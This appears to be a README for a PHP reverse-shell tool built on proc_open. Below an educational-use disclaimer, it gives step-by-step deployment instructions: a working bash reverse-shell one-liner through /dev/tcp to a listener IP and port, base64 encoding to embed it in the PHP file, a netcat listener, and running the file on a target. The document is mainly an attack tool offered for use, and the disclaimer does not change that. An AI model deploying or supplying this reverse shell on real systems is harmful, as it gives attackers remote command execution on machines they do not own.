# Disclaimer

This script is provided for educational purposes only.
The intent of this script is to help users understand how proc_open function can be abused to get a command execution.

Usage of this script must comply with applicable laws and ethical guidelines.
Unauthorized testing or attacks against systems you do not own or have explicit permission to test is illegal and unethical. The author of this script is not responsible for any misuse or damage caused by this script.

By using this script, you agree to:

Use it only on systems you own or have explicit permission to test.
Not hold the author or contributors liable for any direct, indirect, or consequential damages resulting from its use.

# Usage

1. Clone Repository
```bash
git clone https://github.com/Boon-Rekcah/php-reverse-shell-proc_open.git
```
2. Convert your one liner reverse shell payload to Base64
```bash
echo -n 'sh -i >& /dev/tcp/<Listener IP>/<Listener Port> 0>&1' | base64
```

3. Add your base64 payload at Line 8 on proc_openrshell.php

4. Start Netcat Listener

5. Transfer file to Target and execute proc_openrshell.php

